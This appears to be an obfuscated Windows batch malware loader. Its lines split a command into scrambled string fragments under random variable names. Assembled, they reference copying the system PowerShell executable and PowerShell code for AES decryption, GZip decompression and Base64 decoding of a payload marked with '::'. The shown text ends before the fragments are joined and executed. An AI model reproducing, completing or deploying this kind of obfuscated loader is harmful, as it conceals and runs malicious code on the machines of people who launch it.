@echo off
set "gKhIKYQuHB=in"
set "CiPeupHcqo=co"
set "LpbbxZshFN=em"
set "vOAvErxFme=rS"
set "kkLcIfcxGw=s\"
set "KMDoljQlZO=we"
set "opWOJlkMVH=Wi"
set "uZmqHyDrNK= C"
set "nRwfALiuXU=Sy"
set "RvkScHsxhW=0\"
set "AesVHPqkpK=Po"
set "eyDCuBpNwX=we"
set "MppFyLzVKT=ow"
set "VlOZgxfXFX= /"
set "PrIQxGqhtZ=:\"
set "fOnCvGrkSe=ws"
set "qDNUIMDWrp=\v"
set "MljbcVtVSb=rs"
set "HoflwfSWGS=ll"
set "QgxtkVDvpS=.e"
set "AySaIUSkeN=32"
set "kejoSCWzwW=nd"
set "HFCDboJUDE=he"
set "tgOuiFoFwa=he"
set "gMxrOdRHUp=po"
set "sLXkdzVZBg=1."
set "UOwdnHlKiU=ll"
set "CfXQjtzoOK=\W"
set "diLizAsebX=py"
set "KQLwnYZrpY=st"
set "KWOSVDXigG=xe"
set "sbPktlYLNs=do"
set "dwoZlnJvkm=y "
set "MWvUKgNRNW=cd"
set "acBwGsNbMH= %~dp0"
set "ZfuJQTDDwL=ress"
set "EiFGrOcuWh=Syst"
set "nJTSydZyjF=esaB"
set "qCUKhpeXjx=ew-O"
set "WuHNBtGTCI=.Cop"
set "BgardpAOik=PTtG"
set "lZWeDzncVf=gjYA"
set "rmiWgJDSWB= = N"
set "CvgKsVgVNs=.Dis"
set "IbdtqZjeHb=:: '"
set "hJYEiKKNuX=sion"
set "kibvDCwTfr= '')"
set "avfyhoCJDU=em.C"
set "RIgEKfQVFc=ress"
set "GEIZlJVmQt=).Sp"
set "FsRQOvbXnA=smdM"
set "QJsduKVQaC=();$"
set "GMloYJTRwO='[-1"
set "AuhTXpmZNZ=BC;$"
set "nJBteogivu=ddin"
set "sgwJpJqXEd=se()"
set "rxriylEcpo=Star"
set "wJZWvCUIqA=-Obj"
set "fklNqNkYve=e = "
set "wBbZlMtOhA=[Sys"
set "rXHIjkFZsI=uWUv"
set "kCLJUvLtMj=m(, "
set "ECkNVahMnY=raph"
set "HvnAhBPqHc=d;$M"
set "hIbKlggjEf=::('"
set "ctnXWWTNaQ=onve"
set "koHEaaxJfE=nage"
set "zQHSLSTqHn=.Cre"
set "MlTRbBmxLc=ing("
set "OEHpyxkjmq=();$"
set "qgLiMmKEeq=n ''"
set "RNRbBNyuLc=tem."
set "dObsLxqoxy=c.Pa"
set "eRrOdQJJrr=ddin"
set "YkKLWCMHFm=Syst"
set "ULouSAsUgT=.IO."
set "JAhqoVqOwE=.Mem"
set "WAEQAgVXnp=ewLi"
set "jIMBtYUIZf=S, 0"
set "BFCImMskOQ=rt]:"
set "UuAizgrlJt=qS ="
set "nGdunVSPhJ=.GZi"
set "dSHegmTfvQ=Np);"
set "CqcnFcADhZ=ispo"
set "cIYvhJRgda=fmNp"
set "FvXRAcquTm=Obje"
set "JFQdqKUTHl=urit"
set "XqGCKAUGwo=yste"
set "MbzpKodVwB=stem"
